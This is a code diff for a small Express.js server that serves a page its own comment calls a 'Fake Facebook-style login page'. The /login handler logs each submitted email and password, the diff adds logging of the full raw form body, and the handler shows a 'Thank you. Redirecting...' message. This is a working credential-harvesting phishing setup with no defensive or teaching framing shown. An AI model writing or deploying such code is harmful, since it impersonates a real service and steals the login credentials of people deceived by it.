@@ -2,8 +2,16 @@ const express = require('express');
 const app = express();
 const port = process.env.PORT || 3000;
 
+// Middleware to parse form input
 app.use(express.urlencoded({ extended: true }));
 
+// Log every request with timestamp
+app.use((req, res, next) => {
+  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
+  next();
+});
+
+// Fake Facebook-style login page
 app.get('/', (req, res) => {
   res.send(`
     <style>
@@ -30,12 +38,26 @@ app.get('/', (req, res) => {
   `);
 });
 
+// Handle form submission
 app.post('/login', (req, res) => {
-  const { email, password } = req.body;
-  console.log(`Fake login — Email/Phone: ${email}, Password: ${password}`);
+  console.log("Form submitted. Raw body:", req.body);
+  const { email, password } = req.body || {};
+  console.log(`FAKE LOGIN — Email: ${email}, Password: ${password}`);
   res.send("<h2>Thank you. Redirecting...</h2>");
 });
 
+// Health check route
+app.get('/ping', (req, res) => {
+  res.send("pong");
+});
+
+// Error handling
+app.use((err, req, res, next) => {
+  console.error("Server error:", err);
+  res.status(500).send("Something broke.");
+});
+
+// Start server
 app.listen(port, () => {
   console.log(`Server running on http://localhost:${port}`);
 });
